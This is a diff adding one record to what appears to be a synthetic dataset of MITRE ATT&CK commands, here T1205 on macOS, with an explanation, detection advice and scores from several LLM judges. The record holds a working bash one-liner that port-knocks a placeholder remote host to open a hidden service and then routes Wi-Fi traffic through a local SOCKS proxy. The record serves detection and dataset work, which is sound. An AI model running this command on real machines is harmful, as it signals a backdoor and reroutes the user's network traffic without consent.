@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "for p in 10501 10503 10507; do nc -w1 -z 203.0.113.10 \"$p\"; sleep 1; done && networksetup -setsocksfirewallproxy \"Wi-Fi\" 127.0.0.1 1080 && networksetup -setsocksfirewallproxystate \"Wi-Fi\" on",
+  "explanation": "Sends a TCP port-knock sequence (SYN scans without data) to a remote host to signal a hidden service to open, then configures the system to route traffic via a local SOCKS proxy. Detection: monitor sequences of failed/unsolicited SYN attempts to high ports and audit networksetup proxy state changes.",
+  "rationale_steps": [
+    "Generate a 3-step TCP port knocking sequence using nc to 203.0.113.10 on ports 10501, 10503, 10507.",
+    "If the remote service is listening for the sequence, it may open a backdoor port or change firewall rules.",
+    "Immediately configure the Wi-Fi service to use a local SOCKS proxy for post-activation communications.",
+    "Detect by alerting on unusual outbound SYN bursts to closed/high ports and on proxy state changes via system configuration logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-bb106663",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash for-loop with valid nc and networksetup flags, balanced quotes, and correct command chaining.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements port knocking consistent with T1205 and sets a macOS SOCKS proxy, but proxy changes may require elevated privileges and the loop’s success is not conditioned on the knock outcome.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T13:56:54.647896Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct use of a for loop, proper semicolons and && separators, valid nc flags (-w1 -z), and correct networksetup subcommand syntax for macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 port-knocking by sending sequential SYN probes to ports 10501, 10503, 10507 with timing delays to signal a hidden service, then configures a SOCKS proxy via networksetup to route subsequent traffic through a local tunnel — a realistic and operationally coherent implementation of traffic signaling combined with C2 channel establishment on macOS.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T03:46:52.481310Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command follows standard Bash loop syntax and uses valid flags for both netcat and the macOS networksetup utility.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements a port-knocking sequence followed by proxy configuration, though executing networksetup to modify system settings typically requires administrative privileges on macOS.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T03:46:52.785809Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
